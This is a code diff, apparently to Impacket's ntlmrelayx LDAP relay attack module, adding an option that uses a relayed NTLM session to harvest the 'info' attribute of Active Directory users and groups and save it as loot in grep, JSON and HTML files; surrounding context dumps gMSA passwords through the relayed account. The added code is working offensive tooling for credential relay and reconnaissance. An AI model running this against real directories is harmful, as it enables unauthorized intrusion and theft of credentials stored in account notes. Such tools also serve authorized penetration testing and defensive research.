@@ -27,6 +27,8 @@ import re
 import dns.resolver
 import ldap3
 import ldapdomaindump
+import csv
+import html
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
 from ldap3.protocol.microsoft import security_descriptor_control
 from ldap3.protocol.formatters.formatters import format_sid
@@ -1078,6 +1080,67 @@ class LDAPAttack(ProtocolAttack):
                 else:
                     LOG.info("Successfully dumped %d gMSA passwords through relayed account %s" % (count, self.username))
                     fd.close()
+
+        # Dump user and group domain objects info attributes
+        if self.config.dumpinfoattr:
+            LOG.info("Attempting to dump user info attributes")
+            entries = list(self.client.extend.standard.paged_search(
+                domainDumper.root,
+                '(&(info=*)(|(objectCategory=person)(objectCategory=group)))',
+                attributes=['sAMAccountName', 'memberOf', 'info'],
+                generator=True,
+            ))
+            entries = [e for e in entries
+                       if e.get('type') == 'searchResEntry' and e.get('raw_attributes', {}).get('info') is not None]
+            if not entries:
+                LOG.info("No user info attributes found readable by %s" % self.username)
+            else:
+                os.makedirs(self.config.lootdir, exist_ok=True)
+                stamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
+                base = os.path.join(self.config.lootdir, 'domain_objects_info_' + stamp)
+
+                # .grep - for grepable output with tab delimiter
+                with open(base + '.grep', 'w', encoding='utf-8') as f:
+                    writer = csv.writer(f, delimiter='\t')
+                    writer.writerow(['sAMAccountName', 'memberOf', 'info'])
+                    for e in entries:
+                        sam  = e['attributes']['sAMAccountName'] or ''
+                        dn   = e['attributes']['memberOf'] or ''
+                        info = (e['attributes']['info'] or '').replace('\n', ' ').replace('\r', '')
+                        writer.writerow([sam, dn, info])
+
+                # .json - array of dicts
+                with open(base + '.json', 'w', encoding='utf-8') as f:
+                    out = [{'sAMAccountName': e['attributes']['sAMAccountName'],
+                            'memberOf': e['attributes']['memberOf'],
+                            'info': e['attributes']['info']}
+                           for e in entries]
+                    json.dump(out, f, indent=2, default=str)
+
+                    # .html - table matching ldapdomaindump style
+                    def _he(s):
+                        return html.escape(str(s))
+
+                    with open(base + '.html', 'w', encoding='utf-8') as f:
+                        f.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><style>'
+                                'body{font-family:arial,sans-serif;font-size:12px}'
+                                'table{border-collapse:collapse;width:100%}'
+                                'th,td{border:1px solid #aaa;padding:3px 6px;text-align:left;vertical-align:top}'
+                                'th{background:#336699;color:#fff}'
+                                'tr:nth-child(even){background:#f2f2f2}'
+                                '</style></head><body>\n'
+                                '<table><thead>'
+                                '<tr><td colspan="3"><b>Domain user and group objects - info attribute</b></td></tr>'
+                                '<tr><th>sAMAccountName</th><th>memberOf</th><th>info</th></tr>'
+                                '</thead><tbody>\n')
+                        for e in entries:
+                            f.write('<tr><td>%s</td><td>%s</td><td>%s</td></tr>\n' % (
+                                _he(e['attributes']['sAMAccountName']),
+                                _he(e['attributes']['memberOf']),
+                                _he(e['attributes']['info'])))
+                        f.write('</tbody></table></body></html>\n')
+
+                LOG.info("Dumped info attribute for %d domain object(s) to %s.{grep,json,html}" % (len(entries), base))
 
         if not dumpedAdcs and self.config.dumpadcs:
             dumpedAdcs = True
